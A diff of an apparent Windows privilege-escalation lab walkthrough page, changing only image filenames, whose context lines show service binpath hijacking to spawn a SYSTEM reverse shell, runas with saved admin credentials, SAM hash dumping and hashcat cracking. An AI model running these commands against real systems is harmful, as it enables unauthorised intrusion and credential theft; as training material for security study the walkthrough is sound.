@@ -70,7 +70,7 @@ Use accesschk.exe to check the "user" account's permissions on the "daclsvc" ser
 C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
 ```
 
-<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 Note that the "user" account has the permission to change the service config (S**ERVICE\_CHANGE\_CONFIG**).
 
@@ -82,7 +82,7 @@ Query the service and note that it runs with SYSTEM privileges (SERVICE\_START\_
 sc qc daclsvc
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Modify the service config and set the BINARY\_PATH\_NAME (binpath) to the reverse.exe executable you created:
 
@@ -94,7 +94,7 @@ sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""
 sc qc daclsvc
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
 
@@ -110,7 +110,7 @@ rlwrap nc -nvlp 54
 net start daclsvc
 ```
 
-<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Service Exploits - Unquoted Service Path
 
@@ -392,7 +392,7 @@ List any saved credentials:
 cmdkey /list
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 Note that credentials for the "admin" user are saved. If they aren't, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.
 
@@ -410,7 +410,7 @@ rlwrap nc -nvlp 54
 runas /savecred /user:admin C:\PrivEsc\reverse.exe
 ```
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Passwords - Security Account Manager (SAM)
 
@@ -441,7 +441,7 @@ pip3 install pycrypto
 python3 creddump7/pwdump.py SYSTEM SAM
 ```
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Crack the admin NTLM hash using hashcat:
 
